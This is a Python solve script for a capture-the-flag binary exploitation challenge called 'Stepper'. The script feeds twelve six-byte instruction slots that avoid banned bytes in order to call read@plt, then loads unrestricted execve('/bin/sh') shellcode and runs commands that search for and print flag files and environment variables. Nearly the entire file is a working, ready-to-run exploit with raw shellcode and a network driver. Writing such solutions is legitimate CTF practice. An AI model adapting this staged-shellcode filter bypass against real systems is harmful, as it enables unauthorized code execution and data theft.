#!/usr/bin/env python3
"""CSCTF Stepper: 12-step restricted shellcode / staged execution exploit.

Local:  python3 solve.py --local
Remote: python3 solve.py --host HOST --port PORT
For local mode, extract stepper.tar.gz beside this script so stepper is here.
"""
import argparse
import os
import re
import select
import socket
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
BANNED = {0x0F, 0x05, 0x34, 0xCD}

STEPS = [
    bytes.fromhex("e8 00 00 00 00"),       # call next; push code+5
    bytes.fromhex("5b"),                   # pop rbx = code+5
    bytes.fromhex("48 8b 43 09"),          # rax = [code+14] = guest_exit
    bytes.fromhex("48 2d 17 13 00 00"),    # rax -= guest_exit's static offset 0x1317
    bytes.fromhex("48 2d a0 ee ff ff"),    # rax += read@plt offset 0x1160
    bytes.fromhex("49 89 c4"),             # r12 = read@plt
    bytes.fromhex("31 ff"),                # rdi = 0 (stdin)
    bytes.fromhex("4c 8d 6b 7b"),          # r13 = code+0x80 (RWX staging area)
    bytes.fromhex("4c 89 ee"),             # rsi = r13
    bytes.fromhex("ba 00 04 00 00"),       # rdx = 0x400
    bytes.fromhex("41 ff d4"),             # call r12 -> read(0, code+0x80, 0x400)
    bytes.fromhex("41 ff e5"),             # jmp r13 -> second-stage shellcode
]

# This second-stage payload is delivered through read(), not through the
# six-byte instruction slots, so the per-step byte filter never sees 0f 05.
SHELLCODE = (
    bytes.fromhex(
        "31 f6"                  # xor esi, esi
        "31 d2"                  # xor edx, edx
        "b8 3b 00 00 00"          # mov eax, 59 (execve)
        "48 8d 3d 02 00 00 00"    # lea rdi, [rip+2] -> /bin/sh
        "0f 05"                  # syscall (allowed in stage 2)
    )
    + b"/bin/sh\x00"
)


class Tube:
    def __init__(self, sock):
        self.sock = sock
        self.buffer = b""

    def send(self, data):
        self.sock.sendall(data)

    def recvuntil(self, token, timeout=10):
        deadline = time.monotonic() + timeout
        while token not in self.buffer:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError(f"waiting for {token!r}; buffered={self.buffer!r}")
            self.sock.settimeout(remaining)
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(f"connection closed; buffered={self.buffer!r}")
            self.buffer += chunk
        end = self.buffer.index(token) + len(token)
        result, self.buffer = self.buffer[:end], self.buffer[end:]
        return result

    def drain(self, idle=1.0, total=7.0):
        output, self.buffer = self.buffer, b""
        deadline = time.monotonic() + total
        while time.monotonic() < deadline:
            ready, _, _ = select.select([self.sock], [], [], min(idle, deadline - time.monotonic()))
            if not ready:
                break
            chunk = self.sock.recv(4096)
            if not chunk:
                break
            output += chunk
        return output


def local_connection():
    binary = HERE / "stepper"
    if not binary.exists():
        raise FileNotFoundError("Extract stepper.tar.gz beside solve.py first")
    parent, child = socket.socketpair()
    process = subprocess.Popen(
        [str(binary)], stdin=child.fileno(), stdout=child.fileno(), stderr=child.fileno(),
        cwd=str(HERE), close_fds=True,
    )
    child.close()
    return parent, process


def main():
    for number, step in enumerate(STEPS, 1):
        if len(step) > 6:
            raise ValueError(f"step {number} exceeds the six-byte limit")
        if any(byte in BANNED for byte in step):
            raise ValueError(f"step {number} contains a forbidden byte")

    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--local", action="store_true", help="run the bundled local challenge")
    parser.add_argument("--host", help="authorized challenge host")
    parser.add_argument("--port", type=int, help="authorized challenge port")
    args = parser.parse_args()
    if not args.local and (not args.host or args.port is None):
        parser.error("supply --local or both --host and --port")

    process = None
    if args.local:
        sock, process = local_connection()
        print("[+] Started bundled Stepper locally")
    else:
        print(f"[+] Connecting to {args.host}:{args.port}")
        sock = socket.create_connection((args.host, args.port), timeout=10)
    tube = Tube(sock)
    try:
        banner = tube.recvuntil(b"[step 1/12] length> ")
        print(banner.decode("utf-8", "replace"), end="")

        # Steps 1-11 establish the read@plt call and receive the unrestricted
        # second-stage shellcode while the guest is blocked inside read().
        for number, code in enumerate(STEPS[:11], 1):
            tube.send(str(len(code)).encode() + b"\n")
            tube.recvuntil(b"code> ")
            tube.send(code)
            if number == 11:
                time.sleep(0.1)
                tube.send(SHELLCODE)
            output = tube.recvuntil(b"step done.\n")
            print(output.decode("utf-8", "replace"), end="")

        tube.recvuntil(b"length> ")
        final = STEPS[11]
        tube.send(str(len(final)).encode() + b"\n")
        tube.recvuntil(b"code> ")
        tube.send(final)

        time.sleep(0.15)
        tube.send(
            b"echo STEPPER_SHELL_SUCCESS; id; pwd; "
            b"cat /flag /flag.txt ./flag ./flag.txt /home/ctf/flag /app/flag 2>/dev/null; "
            b"find /home /app /opt /tmp -maxdepth 4 -type f "
            b"\\( -name flag -o -name flag.txt \\) -exec cat {} \\; 2>/dev/null; "
            b"env | grep -i flag; exit\n"
        )
        output = tube.drain(idle=1.0, total=7.0)
        text = output.decode("utf-8", "replace")
        print(text, end="" if text.endswith("\n") else "\n")
        if "STEPPER_SHELL_SUCCESS" not in text:
            raise RuntimeError("The final jump into second-stage shellcode was not confirmed")
        print("[+] Shell execution confirmed")
        match = re.search(r"CSCTF\{[^}\r\n]+\}", text)
        if match:
            print("[+] Candidate flag:", match.group(0))
        else:
            print("[-] No flag was returned by this target session")
    finally:
        sock.close()
        if process:
            try:
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait()


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise
